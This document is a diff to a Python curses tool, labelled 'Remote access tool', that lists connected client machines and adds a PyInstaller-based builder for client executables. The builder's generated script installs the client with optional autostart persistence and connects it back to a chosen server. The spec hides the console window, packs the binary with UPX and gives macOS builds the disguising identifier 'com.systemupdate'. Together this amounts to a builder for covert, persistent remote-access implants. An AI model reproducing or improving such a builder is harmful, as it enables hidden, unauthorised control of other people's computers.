@@ -1,10 +1,20 @@
 import curses
+import json
 import socket
+from importlib.metadata import PackageNotFoundError, distribution
 from typing import Tuple
+import os
+import sys
+import shutil
+import subprocess
+import pkg_resources
+from pathlib import Path
 
-import cli.clientCli
+from executing import cache
+
 from cli.clientCli import start_client_cli
 from client import Client
+from config.config import save_config, load_config
 
 
 def init_colors():
@@ -12,9 +22,9 @@ def init_colors():
     curses.start_color()
     curses.use_default_colors()
     curses.init_pair(1, curses.COLOR_BLUE, -1)  # Título
-    curses.init_pair(2, curses.COLOR_BLUE, -1)  # Selección
+    curses.init_pair(2, curses.COLOR_CYAN, -1)  # Selección
     curses.init_pair(3, curses.COLOR_GREEN, -1)  # Bordes (estado activo)
-    curses.init_pair(4, curses.COLOR_RED, -1)  # Estado inactivo
+    curses.init_pair(4, curses.COLOR_YELLOW, -1)  # Estado inactivo
     curses.init_pair(5, curses.COLOR_YELLOW, -1)  # Estado de ayuda o aviso
 
 
@@ -110,8 +120,8 @@ def show_connections(stdscr, server):
                 if actual_index < total_connections:
                     try:
                         client = connected_clients[actual_index]
-                        name = client.send_command(command='hostname')
-                        ip = client.send_command(command='ip')
+                        name = client.send_command(command='hostname').split(": ")[1]
+                        ip = client.send_command(command='ip').split("IP Local: ")[1].split()[0]
 
                         status_color = curses.color_pair(4)
                         status_symbol = "●"
@@ -260,32 +270,35 @@ def show_client_details(stdscr, client: Client):
 
 
 def create_executable(stdscr):
-    curses.curs_set(1)  # Mostrar el cursor
+    curses.curs_set(1)  # Show cursor
     stdscr.clear()
     init_colors()
-    # Variables para las selecciones
-    persistence_option = False
+
+    # Load initial configuration
+    config = load_config()
+
+    persistence_option = config.get("persistence", False)
     platforms = ["Windows", "Linux", "macOS"]
-    current_platform = 0
-    host = ""
-    port = ""
-    current_option = 0  # Opción actual seleccionada
+    current_platform = platforms.index(config.get("platform", "Windows"))
+    host = config.get("host", "")
+    port = str(config.get("port", 8080))
+    current_option = 0  # Current selected option
 
     while True:
         stdscr.clear()
         height, width = stdscr.getmaxyx()
-        start_y = height // 2 - 8  # Ajustado para mejor distribución
-        start_x = width // 2 - 25  # Centro horizontal
+        start_y = height // 2 - 8
+        start_x = width // 2 - 25
 
-        # Título y marco
+        # Title and frame
         stdscr.addstr(start_y, start_x, "╔══════════════ Crear Ejecutable ══════════════╗", curses.A_BOLD)
         stdscr.addstr(start_y + 14, start_x, "╚════════════════════════════════════════════╝", curses.A_BOLD)
 
-        # Instrucciones de navegación
+        # Navigation instructions
         instructions = "↑↓: Navegar | Enter: Seleccionar | Esc: Salir"
         stdscr.addstr(start_y - 2, width // 2 - len(instructions) // 2, instructions, curses.color_pair(4))
 
-        # 1. Opción de persistencia
+        # 1. Persistence option
         field_text = "Persistencia:"
         stdscr.addstr(start_y + 2, start_x + 2, field_text)
         if current_option == 0:
@@ -295,7 +308,7 @@ def create_executable(stdscr):
             stdscr.addstr(start_y + 2, start_x + len(field_text) + 3, "Sí" if persistence_option else "No",
                           curses.color_pair(2))
 
-        # 2. Selector de plataforma
+        # 2. Platform selector
         stdscr.addstr(start_y + 4, start_x + 2, "Plataforma:")
         platform_x = start_x + 13
         for idx, platform in enumerate(platforms):
@@ -306,7 +319,7 @@ def create_executable(stdscr):
                 stdscr.addstr(start_y + 4, platform_x + idx * 12, f" {platform} ",
                               curses.color_pair(2) if idx == current_platform else curses.A_NORMAL)
 
-        # 3. Campo de host
+        # 3. Host field
         field_text = "Host:"
         stdscr.addstr(start_y + 6, start_x + 2, field_text)
         if current_option == 2:
@@ -316,7 +329,7 @@ def create_executable(stdscr):
             stdscr.addstr(start_y + 6, start_x + len(field_text) + 3, host,
                           curses.color_pair(2))
 
-        # 4. Campo de puerto
+        # 4. Port field
         field_text = "Puerto:"
         stdscr.addstr(start_y + 8, start_x + 2, field_text)
         if current_option == 3:
@@ -326,7 +339,7 @@ def create_executable(stdscr):
             stdscr.addstr(start_y + 8, start_x + len(field_text) + 3, port,
                           curses.color_pair(2))
 
-        # Botón de confirmación
+        # Confirmation button
         button_text = "[ Confirmar ]"
         if current_option == 4:
             stdscr.addstr(start_y + 11, width // 2 - len(button_text) // 2, button_text,
@@ -335,7 +348,7 @@ def create_executable(stdscr):
             stdscr.addstr(start_y + 11, width // 2 - len(button_text) // 2, button_text,
                           curses.color_pair(2))
 
-        # Campo activo actual
+        # Active field display
         active_field = ["Persistencia", "Plataforma", "Host", "Puerto", "Confirmar"][current_option]
         status_text = f"Campo activo: {active_field}"
         stdscr.addstr(height - 2, width // 2 - len(status_text) // 2, status_text, curses.color_pair(4))
@@ -351,32 +364,49 @@ def create_executable(stdscr):
         elif key == curses.KEY_UP:
             current_option = (current_option - 1) % 5
         elif key == curses.KEY_RIGHT:
-            if current_option == 1:  # Plataforma
+            if current_option == 1:  # Platform
                 current_platform = (current_platform + 1) % len(platforms)
-            elif current_option == 0:  # Persistencia
+            elif current_option == 0:  # Persistence
                 persistence_option = not persistence_option
         elif key == curses.KEY_LEFT:
-            if current_option == 1:  # Plataforma
+            if current_option == 1:  # Platform
                 current_platform = (current_platform - 1) % len(platforms)
-            elif current_option == 0:  # Persistencia
+            elif current_option == 0:  # Persistence
                 persistence_option = not persistence_option
         elif key in [10, 13]:  # Enter
-            if current_option == 4:  # Botón confirmar
-                if host and port:  # Validación básica
-                    stdscr.addstr(start_y + 12, start_x + 2, "✓ Ejecutable creado con éxito!",
-                                  curses.color_pair(2) | curses.A_BOLD)
+            if current_option == 4:  # Confirm button
+                if host and port:  # Basic validation
+                    # Save configuration
+                    config["persistence"] = persistence_option
+                    config["platform"] = platforms[current_platform]
+                    config["host"] = host
+                    config["port"] = int(port)
+                    save_config(config)
+
+                    # Compilar el ejecutable
+                    success, message = compile_client(config, platforms[current_platform])
+
+                    if success:
+                        stdscr.addstr(start_y + 12, start_x + 2, "✓ Ejecutable creado con éxito!",
+                                      curses.color_pair(2) | curses.A_BOLD)
+                        stdscr.addstr(start_y + 13, start_x + 2, message,
+                                      curses.color_pair(2))
+                    else:
+                        try:
+                            stdscr.addstr(start_y + 12, start_x + 2, "⚠ Error en la compilación",
+                                      curses.color_pair(1) | curses.A_BOLD)
+                            stdscr.addstr(start_y + 13, start_x + 2, message,
+                                      curses.color_pair(1))
+                            print(f"Error al compilar el ejecutable: {message}")
+                        except curses.error:
+                            print(f"Error al mostrar mensaje: {message}")
+
                     stdscr.refresh()
-                    curses.napms(1500)
+                    curses.napms(2500)  # Mostrar el mensaje por más tiempo
                     break
-                else:
-                    error_msg = "⚠ Error: Host y Puerto son requeridos"
-                    stdscr.addstr(start_y + 12, start_x + 2, error_msg,
-                                  curses.color_pair(1) | curses.A_BOLD)
-                    stdscr.refresh()
-                    curses.napms(1500)
         elif current_option == 2 and (32 <= key <= 126):  # Host
             host += chr(key)
-        elif current_option == 3 and len(port) < 5 and 48 <= key <= 57:  # Puerto
+        elif current_option == 3 and len(port) < 5 and 48 <= key <= 57:  # Port
             port += chr(key)
         elif key in [curses.KEY_BACKSPACE, 127, 8]:  # Backspace
             if current_option == 2:
@@ -385,7 +415,6 @@ def create_executable(stdscr):
                 port = port[:-1]
 
     curses.curs_set(0)
-
 
 def show_message(stdscr, message, y, x):
     stdscr.addstr(y, x, message)
@@ -462,14 +491,15 @@ def show_logo(stdscr, logo):
 
 def menu_init(stdscr, logo, menu, current_row):
     stdscr.clear()
+    init_colors()
     show_logo(stdscr, logo)
     for idx, row in enumerate(menu):
         x = stdscr.getmaxyx()[1] // 2 - len(row) // 2
         y = stdscr.getmaxyx()[0] // 2 - len(menu) // 2 + idx
         if idx == current_row:
-            stdscr.attron(curses.color_pair(1))
+            stdscr.attron(curses.color_pair(2))
             stdscr.addstr(y, x, row)
-            stdscr.attroff(curses.color_pair(1))
+            stdscr.attroff(curses.color_pair(2))
         else:
             stdscr.addstr(y, x, row)
     stdscr.refresh()
@@ -487,7 +517,7 @@ def handle_key_navigation(key, current_row, num_options):
 def main_menu(stdscr, server):
     menu = ["CREAR EJECUTABLE", "VER CONEXIONES", "SALIR"]
     current_row = 0
-    logo = ["T I T U L O ", "-------------------"]
+    logo = ["Remote access tool ", "-------------------"]
     while True:
         menu_init(stdscr, logo, menu, current_row)
         key = stdscr.getch()
@@ -501,3 +531,190 @@ def main_menu(stdscr, server):
                 show_connections(stdscr, server)
             elif menu[current_row] == "SALIR":
                 break
+
+
+def compile_client(config, platform_target):
+    """
+    Compila el módulo cliente usando PyInstaller con la configuración específica.
+
+    Args:
+        config (dict): Configuración actual del cliente
+        platform_target (str): Plataforma objetivo ('Windows', 'Linux', 'macOS')
+    """
+    # Obtener el directorio base actual
+    base_dir = Path.cwd()
+
+    # Verificar si PyInstaller está instalado
+    try:
+        distribution('pyinstaller')
+    except PackageNotFoundError:
+        print("PyInstaller no encontrado. Instalando...")
+        try:
+            subprocess.run([sys.executable, '-m', 'pip', 'install', 'pyinstaller'],
+                           check=True,
+                           capture_output=True,
+                           text=True)
+        except subprocess.CalledProcessError as e:
+            return False, f"Error instalando PyInstaller: {e.stderr}"
+
+    # Crear directorio temporal base
+    temp_dir = base_dir / 'temp_build'
+    temp_dir.mkdir(exist_ok=True)
+
+    # Crear un archivo temporal de configuración
+    temp_config_dir = temp_dir / 'config'
+    temp_config_dir.mkdir(exist_ok=True)
+    temp_config_path = temp_config_dir / 'config.json'
+
+    with open(temp_config_path, 'w') as f:
+        json.dump(config, f)
+
+    # Determinar extensión del ejecutable
+    exe_ext = '.exe' if platform_target == 'Windows' else ''
+
+    # Preparar directorio de salida específico para la plataforma
+    dist_path = base_dir / 'dist' / platform_target.lower()
+    work_path = base_dir / 'build' / platform_target.lower()
+
+    # Manejar el manifiesto de Windows si es necesario
+    manifest_path = None
+
+
+    # Definir los archivos del módulo client
+    client_files = [
+        'client.py',
+        'functions.py',
+        'setup.py',
+        '__init__.py'
+    ]
+
+    # Copiar archivos del módulo client a directorio temporal
+    temp_client_dir = temp_dir / 'client'
+    temp_client_dir.mkdir(exist_ok=True)
+
+    for file in client_files:
+        source_path = base_dir / 'client' / file
+        if source_path.exists():
+            shutil.copy2(source_path, temp_client_dir / file)
+        else:
+            print(f"Advertencia: No se encontró el archivo {file}")
+
+    # Crear un script principal temporal para la compilación
+    main_script = """
+from client.client import Client
+from client.setup import ClientSetup
+from config.config import load_config
+
+def init(persistence: bool = True, server_host: str = '127.0.0.1', server_port: int = 8080):
+    client_setup = ClientSetup(__file__)
+    
+    # Verificar si ya hay una instalacion existente
+    if client_setup.detect_existing_installation().get('installed'):
+        print("Instalacion existente detectada.")
+    else:
+        print("No se detecto instalacion. Procediendo a la instalacion...")
+        client_setup.install(create_autostart=persistence)
+
+    # Crear y conectar el cliente
+    client1 = Client(server_host, server_port)
+    client1.connect()
+
+if __name__ == "__main__":
+    # Cargar la configuracion
+    config = load_config()
+
+    # Usar la configuracion para inicializar el cliente
+    init(persistence=config['persistence'], server_host=config['host'], server_port=config['port'])
+
+
+"""
+
+    main_path = temp_dir / 'main.py'
+    with open(main_path, 'w') as f:
+        f.write(main_script)
+
+    # Crear el spec file con configuraciones específicas de la plataforma
+    runtime_tmpdir = '/var/tmp' if platform_target == 'Linux' else None
+    bundle_identifier = 'com.systemupdate' if platform_target == 'macOS' else None
+
+    spec_content = f"""
+# -*- mode: python ; coding: utf-8 -*-
+
+a = Analysis(
+    [r'{main_path.absolute().as_posix()}'],
+    pathex=[r'{base_dir.absolute().as_posix()}'],
+    binaries=[],
+    datas=[
+        (r'{temp_config_dir.absolute().as_posix()}', 'config'),
+        (r'{temp_client_dir.absolute().as_posix()}', 'client')
+    ],
+    hiddenimports=[
+        'client.client',
+        'client.functions',
+        'client.setup',
+        'config.config'
+    ],
+    hookspath=[],
+    hooksconfig={{}},
+    runtime_hooks=[],
+    excludes=[],
+    noarchive=False,
+)
+
+pyz = PYZ(a.pure)
+
+exe = EXE(
+    pyz,
+    a.scripts,
+    a.binaries,
+    a.datas,
+    [],
+    name='client{exe_ext}',
+    debug=False,
+    bootloader_ignore_signals=False,
+    strip=False,
+    upx=True,
+    upx_exclude=[],
+    console=False,
+    disable_windowed_traceback=False,
+    target_arch=None,
+    codesign_identity=None,
+    entitlements_file=None,
+    bundle_identifier='{bundle_identifier}',
+    runtime_tmpdir='{runtime_tmpdir}',)
+"""
+
+    # Guardar el spec file
+    spec_path = temp_dir / 'client.spec'
+    spec_path.write_text(spec_content)
+
+    try:
+        # Ejecutar PyInstaller solo con el spec file
+        process = subprocess.run([
+            sys.executable,
+            '-m',
+            'PyInstaller',
+            str(spec_path.absolute()),
+            '--clean',  # Esta opción sí está permitida con spec file
+        ], check=True, capture_output=True, text=True)
+
+        # Mover el ejecutable al directorio específico de la plataforma
+        dist_path.mkdir(parents=True, exist_ok=True)
+
+        source_exe = base_dir / 'dist' / f'client{exe_ext}'
+        if source_exe.exists():
+            shutil.move(str(source_exe), dist_path / f'client{exe_ext}')
+
+        # Limpiar archivos temporales
+        shutil.rmtree(temp_dir, ignore_errors=True)
+        shutil.rmtree(base_dir / 'build', ignore_errors=True)
+
+        return True, f"Ejecutable creado exitosamente en {dist_path}/client{exe_ext}"
+
+    except subprocess.CalledProcessError as e:
+        return False, f"Error durante la compilación: {e.stderr}"
+    except Exception as e:
+        return False, f"Error inesperado: {str(e)}"
+    finally:
+        # Asegurarse de limpiar los archivos temporales incluso si hay errores
+        shutil.rmtree(temp_dir, ignore_errors=True)
